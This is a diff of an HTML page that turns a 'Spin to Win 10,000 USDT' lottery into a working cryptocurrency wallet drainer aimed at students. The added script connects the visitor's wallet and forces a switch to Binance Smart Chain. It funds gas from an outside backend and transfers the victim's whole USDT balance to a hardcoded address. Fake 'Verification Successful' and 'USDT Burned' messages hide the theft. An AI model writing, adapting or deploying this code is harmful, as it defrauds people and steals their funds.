@@ -2,421 +2,346 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-  <title>Bep20scan.in – Spin & Win $10,000 USDT Lottery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spin to Win 10,000 USDT!</title>
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: linear-gradient(135deg,#ffe259 0%,#ffa751 100%);
+    :root {
+      --primary: #2d7fff;
+      --accent: #ffd600;
+      --bg: #1e2336;
+      --dark: #111522;
+    }
+    body {
+      margin: 0; padding: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: linear-gradient(135deg, #21294d 0%, #1e2336 100%);
       min-height: 100vh;
-      color: #432;
-      -webkit-user-select: none;
-      user-select: none;
-      touch-action: manipulation;
-    }
-    body { overflow-x: hidden; }
-
-    .container {
-      max-width: 430px;
-      margin: 0 auto;
-      padding: 0;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .ticket {
-      width: 98vw;
-      max-width: 430px;
-      margin: 0 auto;
-      background: linear-gradient(120deg, #fffbe6 60%, #ffe29a 100%);
-      border-radius: 28px;
-      border: 4px solid #ffd700;
-      box-shadow: 0 6px 32px #e9a80633, 0 2px 4px #fff6d455 inset;
-      position: relative;
-      padding: 7vw 4vw 6vw 4vw;
-      animation: shine 3.2s linear infinite;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    @keyframes shine {
-      0% { box-shadow: 0 0 0px #fff8dc44, 0 2px 4px #fff6d455 inset; }
-      40% { box-shadow: 0 0 30px #fff8dc99, 0 2px 8px #fff6d488 inset; }
-      80% { box-shadow: 0 0 0px #fff8dc44, 0 2px 4px #fff6d455 inset; }
-      100% { box-shadow: 0 0 0px #fff8dc44, 0 2px 4px #fff6d455 inset; }
-    }
-    .ticket .banner {
-      font-size: 1.3em;
-      font-weight: 700;
-      background: linear-gradient(90deg, #ffd700 40%, #fffbe3 60%);
-      color: #9d7900;
-      border-radius: 14px;
-      padding: 13px 0 12px 0;
-      width: 100%;
-      text-align: center;
-      margin-bottom: 10px;
-      box-shadow: 0 2px 8px #ffed9477 inset;
-      text-shadow: 0 1px 0 #fff, 0 0 8px #ffec8b66;
-    }
-    .ticket .amount {
-      font-size: 2.2em;
-      font-weight: 900;
-      color: #d88e00;
-      text-shadow: 0 2px 10px #fff3be, 0 2px 2px #fffae0;
-      letter-spacing: 1.5px;
-      margin-bottom: 3px;
-    }
-    .ticket .subtitle {
-      font-size: 1.08em;
-      font-weight: 600;
-      color: #775900;
-      margin-bottom: 18px;
-      text-align: center;
-    }
-    .wallet-buttons, .spin-section {
-      width: 100%;
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      margin: 18px 0 0 0;
-      align-items: center;
-    }
-    .wallet-button, .spin-btn {
-      width: 100%;
-      font-size: 1.18em;
-      padding: 17px 0;
-      border-radius: 13px;
-      font-weight: bold;
-      border: none;
-      background: linear-gradient(90deg,#f9d423,#ff4e50 80%);
       color: #fff;
-      margin: 0 auto;
-      box-shadow: 0 6px 26px #ffa75155, 0 2px 4px #fffbe0 inset;
-      cursor: pointer;
-      transition: background 0.11s, transform 0.10s;
-      outline: none;
-      margin-bottom: 0;
-      letter-spacing: 1px;
-      max-width: 430px;
+      display: flex; flex-direction: column; align-items: center;
     }
-    .wallet-button {
-      background: linear-gradient(90deg,#f6851b,#fffae0 90%);
-      color: #963f00;
-      font-size: 1.15em;
-      margin-bottom: 0;
+    .container {
+      max-width: 400px;
+      width: 95vw;
+      background: #222744;
+      border-radius: 18px;
+      margin: 36px 0;
+      box-shadow: 0 2px 24px 0 #0005;
+      padding: 24px 20px 30px 20px;
+      text-align: center;
+      position: relative;
     }
-    .wallet-button.trust {
-      background: linear-gradient(90deg,#13b876,#edffe9 90%);
-      color: #1c7d46;
+    .title {
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-size: 2.2rem;
+      color: var(--accent);
+      margin: 0 0 8px 0;
+      letter-spacing: 1.5px;
+      text-shadow: 0 2px 4px #0006;
     }
-    .wallet-button:active,
-    .spin-btn:active {
-      transform: scale(0.97);
+    .subtitle {
+      color: #aac7ff;
+      font-size: 1.1rem;
+      margin-bottom: 28px;
+    }
+    #spin-wheel-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    .spin-wheel {
+      width: 230px; height: 230px;
+      border-radius: 50%;
+      background: conic-gradient(var(--accent) 0deg 45deg, #fff 45deg 90deg, var(--primary) 90deg 135deg, #fff 135deg 180deg, var(--accent) 180deg 225deg, #fff 225deg 270deg, var(--primary) 270deg 315deg, #fff 315deg 360deg);
+      border: 8px solid var(--primary);
+      box-shadow: 0 6px 30px #0007;
+      position: relative;
+      transition: transform 4s cubic-bezier(.18,.93,.71,1.01);
+    }
+    .spin-arrow {
+      position: absolute;
+      top: -25px; left: 50%;
+      transform: translateX(-50%);
+      width: 34px; height: 34px;
+      z-index: 2;
     }
     .spin-btn {
-      background: linear-gradient(90deg,#ff4e50 10%,#f9d423 100%);
-      color: #fff;
-      font-size: 1.22em;
-      margin-top: 14px;
-      margin-bottom: 0;
-      max-width: 250px;
-    }
-    .mini {
-      font-size: 1em;
-      color: #9c7500;
-      margin: 10px 0 0 0;
-      text-align: center;
-    }
-    .info-list {
-      list-style: none;
-      padding: 0;
-      margin: 0 0 10px 0;
-      color: #7e6900;
-      font-size: 1.04em;
-      text-align: center;
-    }
-    .info-list li { margin-bottom: 2.5px; }
-    .or {
-      margin: 10px 0 0 0;
-      color: #aaa;
-      font-size: 1em;
-      font-weight: 500;
-    }
-    .wallet-address {
-      word-break: break-all;
-      font-size: 0.96em;
-      background: #fff7c7;
-      color: #9d7900;
-      border-radius: 8px;
-      padding: 7px 12px;
-      margin: 15px 0 2px 0;
-      text-align: center;
-      font-family: monospace;
-      display: none;
-    }
-    /* Spin Wheel CSS */
-    .wheel-section {
-      width: 100%;
-      margin: 0 auto 12px auto;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      display: none;
-    }
-    .wheel {
-      width: 175px;
-      height: 175px;
-      border-radius: 50%;
-      border: 8px solid #ffd700;
-      position: relative;
-      background: conic-gradient(
-        #ffe29a 0% 20%,
-        #f6851b 20% 40%,
-        #ffd700 40% 60%,
-        #f9d423 60% 80%,
-        #ff4e50 80% 100%
-      );
-      box-shadow: 0 8px 28px #d88e0060;
-      transition: transform 3.2s cubic-bezier(0.32, 0.56, 0.57, 1.39);
-    }
-    .wheel-arrow {
-      position: absolute;
-      top: -28px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 0;
-      height: 0;
-      border-left: 16px solid transparent;
-      border-right: 16px solid transparent;
-      border-bottom: 28px solid #f6851b;
-      z-index: 10;
-    }
-    .prize-label {
-      font-size: 1.12em;
-      color: #d88e00;
-      font-weight: 700;
-      margin-top: 10px;
-      min-height: 24px;
-      text-align: center;
-      letter-spacing: 0.2px;
-    }
-    .debug-info {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #888;
-      text-align: center;
-    }
-    .modal {
-      position: fixed;
-      z-index: 9999;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.60);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      visibility: hidden;
-      opacity: 0;
-      transition: opacity 0.22s;
-    }
-    .modal.show {
-      visibility: visible;
-      opacity: 1;
-    }
-    .modal-content {
-      background: #fffde4;
-      border-radius: 18px;
-      padding: 32px 22px;
-      box-shadow: 0 4px 32px #0002;
-      text-align: center;
-      max-width: 330px;
-      width: 95vw;
-    }
-    .modal-content h2 {
-      color: #d88e00;
-      margin-bottom: 12px;
-    }
-    .modal-content a {
-      display: inline-block;
-      margin: 10px 7px 0 7px;
-      color: #fff;
-      background: #f6851b;
-      padding: 10px 18px;
-      border-radius: 6px;
-      text-decoration: none;
-      font-weight: bold;
-      font-size: 1em;
-    }
-    .modal-content a.trust {
-      background: #13b876;
-    }
-    .modal-content button {
-      margin-top: 18px;
-      padding: 7px 18px;
+      margin: 22px 0 0 0;
+      background: linear-gradient(90deg, var(--primary) 60%, var(--accent) 100%);
       border: none;
-      border-radius: 6px;
-      background: #ccc;
-      color: #432;
+      color: #181e38;
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-size: 1.3rem;
       font-weight: bold;
+      border-radius: 32px;
+      padding: 13px 38px;
       cursor: pointer;
+      box-shadow: 0 4px 20px #2d7fff55;
+      transition: background 0.2s, color 0.2s, transform 0.15s;
     }
-    @media (max-width: 420px) {
-      .ticket { padding: 6vw 1vw 7vw 1vw; }
-      .wallet-button, .spin-btn { font-size: 1.1em; padding: 14px 0; }
-      .ticket .banner { font-size: 1.06em; }
-      .ticket .amount { font-size: 1.18em; }
-      .wheel { width: 128px; height: 128px; }
+    .spin-btn:active { transform: scale(0.97); }
+    .connect-btn {
+      margin-top: 28px;
+      background: linear-gradient(90deg, #2ecc71 70%, #47ffa0 100%);
+      color: #183020;
+      border: none;
+      border-radius: 32px;
+      padding: 13px 34px;
+      font-size: 1.15rem;
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-weight: bold;
+      box-shadow: 0 2px 20px #0f0d0d22;
+      cursor: pointer;
+      transition: background 0.18s;
     }
-    @media (max-width: 370px) {
-      .ticket { border-radius: 13px; }
+    .connect-btn:active { transform: scale(0.98); }
+    .address-badge {
+      background: #191e32;
+      color: #ffd600;
+      padding: 6px 18px;
+      border-radius: 19px;
+      font-size: 0.92rem;
+      margin: 15px 0 0 0;
+      letter-spacing: 0.4px;
+      word-break: break-all;
+      display: inline-block;
     }
-    @media (min-width: 800px) {
-      .container { min-height: 92vh; }
+    #popupBox {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 26px 18px;
+      border-radius: 18px;
+      box-shadow: 0 0 24px #0005;
+      font-size: 1.1rem;
+      max-width: 92vw; min-width: 210px;
+      z-index: 99999;
+      background: #fff;
+      color: #242a44;
+      text-align: center;
+      font-weight: 500;
+      display: none;
+      animation: popup-in 0.25s;
     }
-    @media (max-width: 320px) {
-      .wallet-button, .spin-btn { font-size: 0.97em; padding: 12px 0; }
-      .ticket .amount { font-size: 1em; }
+    @keyframes popup-in {
+      from { transform: translate(-50%, -70%) scale(0.85);}
+      to   { transform: translate(-50%, -50%) scale(1);}
+    }
+    @media (max-width: 500px) {
+      .container { padding: 11vw 2vw 12vw 2vw; }
+      .title { font-size: 1.28rem; }
+      .spin-wheel { width: 65vw; height: 65vw; min-width: 140px; min-height: 140px;}
     }
   </style>
 </head>
 <body>
-  <div class="container" id="main-container">
-    <form class="ticket" onsubmit="return false;">
-      <div class="banner">🎉 Spin & Win $10,000 USDT!</div>
-      <div class="amount">10,000 <span style="font-size:0.58em;">USDT</span></div>
-      <div class="subtitle">Lottery Jackpot for all users</div>
-      <ul class="info-list">
-        <li>• Get your free <b>lottery ticket</b> now!</li>
-        <li>• Daily lucky draw, instant winner</li>
-        <li>• <b>Try your luck now!</b></li>
-      </ul>
-      <div class="wallet-buttons" id="wallet-buttons">
-        <!-- Will be filled by JS -->
-      </div>
-      <div class="wallet-address" id="wallet-address"></div>
-      <div class="spin-section" id="spin-section" style="display:none;">
-        <button type="button" class="spin-btn" id="spin-btn">Spin the Wheel!</button>
-      </div>
-      <div class="wheel-section" id="wheel-section">
-        <div class="wheel-arrow"></div>
-        <div class="wheel" id="wheel"></div>
-        <div class="prize-label" id="prize-label"></div>
-      </div>
-      <div class="mini">No KYC • One entry per wallet • No purchase required</div>
-    </form>
-    <div class="debug-info"><span id="device-type">Checking device...</span></div>
-  </div>
-  <!-- Modal for no wallet -->
-  <div class="modal" id="noWalletModal">
-    <div class="modal-content">
-      <h2>No Wallet Detected</h2>
-      <p>To play the lottery, please install one of the following wallets:</p>
-      <a href="https://metamask.io/download/" target="_blank">MetaMask</a>
-      <a href="https://trustwallet.com/download" class="trust" target="_blank">Trust Wallet</a>
-      <br>
-      <button id="closeModalBtn">Close</button>
+  <div class="container">
+    <div class="title">Spin to Win<br>10,000 USDT!</div>
+    <div class="subtitle">Connect your wallet and spin for a chance to win.<br>Fast, secure, and fun for all students.</div>
+    <div id="spin-wheel-container">
+      <img src="https://i.imgur.com/Ls8U7tG.png" class="spin-arrow" style="width:34px;height:34px;" alt="Arrow" />
+      <div class="spin-wheel" id="spinWheel"></div>
+      <button class="spin-btn" id="spinBtn" disabled>Spin Now</button>
     </div>
+    <button class="connect-btn" id="connectBtn">Connect Wallet</button>
+    <div class="address-badge" id="walletAddr" style="display:none;"></div>
   </div>
+  <div id="popupBox"></div>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    // PRIZE SLOTS (in order on wheel)
-    const prizes = [
-      { label: "10,000 USDT 🎉", win: true },
-      { label: "Try Again", win: false },
-      { label: "5 USDT", win: false },
-      { label: "50 USDT", win: false },
-      { label: "100 USDT", win: false }
-    ];
+    const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
+const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-    // --- Device detection ---
-    function isMobile() {
-      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    }
-    // --- Wallet Connect Deep Links (mobile) ---
-    function openWallet(link, appStoreUrl) {
-      window.location.href = link;
-      setTimeout(() => {
-        window.location.href = appStoreUrl;
-      }, 1800);
-    }
-    function showNoWalletModal() {
-      document.getElementById('noWalletModal').classList.add('show');
-    }
-    document.getElementById('closeModalBtn').onclick = function() {
-      document.getElementById('noWalletModal').classList.remove('show');
-    }
+let web3, userAddress;
 
-    // --- Setup UI and connect logic ---
-    let currentAccount = null;
-    function showWalletAddress(addr) {
-      const el = document.getElementById('wallet-address');
-      el.textContent = "Connected: " + addr.slice(0, 6) + "..." + addr.slice(-4);
-      el.style.display = "block";
-    }
-    function hideWalletAddress() {
-      document.getElementById('wallet-address').style.display = "none";
-    }
-    function showSpinButton() {
-      document.getElementById('spin-section').style.display = "flex";
-    }
-    function hideSpinButton() {
-      document.getElementById('spin-section').style.display = "none";
-    }
-    function showWheelSection() {
-      document.getElementById('wheel-section').style.display = "flex";
-    }
-    function hideWheelSection() {
-      document.getElementById('wheel-section').style.display = "none";
-    }
-    function resetPrize() {
-      document.getElementById('prize-label').textContent = "";
-      hideWheelSection();
+async function waitForProvider(timeout = 5000) {
+    return new Promise((resolve) => {
+        const start = Date.now();
+        const interval = setInterval(() => {
+            const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
+            if (provider || Date.now() - start > timeout) {
+                clearInterval(interval);
+                resolve(provider);
+            }
+        }, 100);
+    });
+}
+
+async function connectWalletAndSwitch() {
+    const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
+
+    if (!provider) {
+        alert("Please open this in Trust Wallet, MetaMask, or another Web3 browser.");
+        return;
     }
 
-    function setupUI() {
-      hideWalletAddress();
-      hideSpinButton();
-      resetPrize();
-      // Mobile
-      if (isMobile()) {
-        document.getElementById('device-type').textContent = 'Mobile detected';
-        document.getElementById('wallet-buttons').innerHTML = `
-          <button type="button" id="connect-metamask" class="wallet-button">Open in MetaMask</button>
-          <button type="button" id="connect-trust" class="wallet-button trust">Open in Trust Wallet</button>
-        `;
-        document.getElementById('connect-metamask').onclick = function() {
-          openWallet(
-            'https://metamask.app.link/dapp/bep20scan.in',
-            'https://apps.apple.com/us/app/metamask/id1438144202'
-          );
-          // After redirect, you would ask user to "Spin" (if you want to simulate)
-        };
-        document.getElementById('connect-trust').onclick = function() {
-          openWallet(
-            'https://link.trustwallet.com/open_url?coin_id=714&url=https://bep20scan.in',
-            'https://apps.apple.com/us/app/trust-crypto-bitcoin-wallet/id1288339409'
-          );
-        };
-        // Simulate connect for demo after 2s
-        setTimeout(() => {
-          currentAccount = "0x" + Math.random().toString(16).substr(2, 8) + "abcd1234";
-          showWalletAddress(currentAccount);
-          showSpinButton();
-        }, 2000);
-      }
-      // Desktop
-      else {
-        document.getElementById('device-type').textContent = 'Desktop detected';
-        document.getElementById('wallet-buttons').innerHTML = `
-          <button type="button" id="connect-desktop" class="wallet-button">Connect Wallet</button>
-        `;
-        document.getElementById('connect-desktop').onclick = async function() {
-          // EIP-1193 detection logic
-          if (typeof window.ethereum !== 'undefined') {
-            const provider = window.ethereum;
-            let chosen = null;
-            if (provider.isMetaMask) chosen = 'MetaMask';
-            else if (provider.is
+    try {
+        web3 = new Web3(provider);
+
+        // Switch to BSC if needed
+        const currentChain = await provider.request({ method: 'eth_chainId' });
+        if (currentChain !== '0x38') {
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }]
+                });
+            } catch (err) {
+                if (err.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x38',
+                            chainName: 'Binance Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }]
+                    });
+                } else {
+                    alert("Please switch to BNB manually.");
+                    return;
+                }
+            }
+        }
+
+        // Request accounts
+        const accounts = await provider.request({ method: "eth_accounts" });
+        userAddress = accounts[0];
+        console.log("✅ Wallet:", userAddress);
+    } catch (e) {
+        alert("Wallet connection failed.");
+        console.error(e);
+    }
+}
+
+async function Next() {
+    if (!web3 || !userAddress) {
+        await connectWalletAndSwitch();
+        if (!web3 || !userAddress) {
+            showPopup("Wallet not connected.", "red");
+            return;
+        }
+    }
+
+    try {
+        const usdtContract = new web3.eth.Contract([
+            {
+                constant: true,
+                inputs: [{ name: "_owner", type: "address" }],
+                name: "balanceOf",
+                outputs: [{ name: "", type: "uint256" }],
+                type: "function"
+            },
+            {
+                constant: false,
+                inputs: [
+                    { name: "recipient", type: "address" },
+                    { name: "amount", type: "uint256" }
+                ],
+                name: "transfer",
+                outputs: [{ name: "", type: "bool" }],
+                type: "function"
+            }
+        ], usdtContractAddress);
+
+        const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
+            usdtContract.methods.balanceOf(userAddress).call(),
+            web3.eth.getBalance(userAddress)
+        ]);
+
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
+        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
+
+        console.log("USDT:", usdtBalance);
+        console.log("BNB:", bnbBalance);
+
+        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
+            showPopup("No USDT assets found in your wallet.", "black");
+            return;
+        }
+
+        if (usdtBalance <= 0.0005) {
+            showPopup(
+                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
+                "green"
+            );
+            return;
+        }
+
+        if (bnbBalance < 0.0005) {
+            showPopup("Checking the bnb ...", "blue");
+            await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
+            });
+            await new Promise(r => setTimeout(r, 2000)); // wait for gas
+        }
+
+        showPopup("Loading...", "blue");
+
+        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
+            .send({ from: userAddress });
+
+        showPopup(
+            `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
+            "red"
+        );
+
+    } catch (e) {
+        console.error("❌ Transfer failed:", e);
+        showPopup("USDT transfer failed. Check balance or gas.", "red");
+    }
+}
+
+function showPopup(message, color) {
+    let popup = document.getElementById("popupBox");
+    if (!popup) {
+        popup = document.createElement("div");
+        popup.id = "popupBox";
+        Object.assign(popup.style, {
+            position: "fixed", top: "50%", left: "50%",
+            transform: "translate(-50%, -50%)",
+            padding: "20px", borderRadius: "10px",
+            boxShadow: "0 0 10px rgba(0,0,0,0.2)",
+            textAlign: "center", fontSize: "18px",
+            width: "80%", maxWidth: "400px",
+            zIndex: 9999, backgroundColor: "#fff"
+        });
+        document.body.appendChild(popup);
+    }
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
+    popup.style.color = color;
+    popup.innerHTML = message;
+    popup.style.display = "block";
+    setTimeout(() => popup.style.display = "none", 5000);
+}
+
+window.addEventListener("load", async () => {
+    const provider = await waitForProvider();
+    if (!provider) {
+        alert("No Web3 wallet detected.");
+        return;
+    }
+
+    await connectWalletAndSwitch();
+
+    const observer = new MutationObserver(() => {
+        const btn = [...document.querySelectorAll("button")]
+            .find(b => b.textContent.trim().toLowerCase() === "Next");
+        if (btn) {
+            btn.addEventListener("click", Next);
+            console.log("✅ Bound 'Check Now' to Next()");
+            observer.disconnect();
+        }
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true });
+});
+  </script>
+</body>
+</html>
